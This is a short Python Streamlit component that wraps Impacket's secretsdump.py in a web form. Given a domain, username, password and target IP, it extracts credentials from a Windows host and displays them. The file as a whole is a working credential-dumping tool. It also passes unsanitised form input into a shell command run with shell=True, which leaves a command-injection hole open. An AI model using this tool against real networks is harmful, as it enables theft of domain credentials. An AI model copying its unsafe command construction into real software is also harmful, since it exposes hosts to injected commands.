import streamlit as st
import subprocess

def run_command(command):
    """Run shell commands and return output."""
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

def impacket_component():
    st.header("Impacket: Extract Domain Credentials")

    # User Inputs
    domain = st.text_input("Enter Domain:", placeholder="e.g., example.local")
    user = st.text_input("Enter Username:", placeholder="e.g., administrator")
    password = st.text_input("Enter Password:", type="password", placeholder="Enter password")
    ip_address = st.text_input("Enter Target IP Address:", placeholder="e.g., 192.168.1.100")

    # Run the Command
    if st.button("Run Impacket"):
        if domain and user and password and ip_address:
            with st.spinner("Extracting credentials..."):
                # Construct the secretsdump.py command
                command = f"secretsdump.py {domain}/{user}:{password}@{ip_address}"
                output = run_command(command)
                st.text_area("Impacket Output", output, height=300)
        else:
            st.warning("⚠️ Please fill in all fields.")
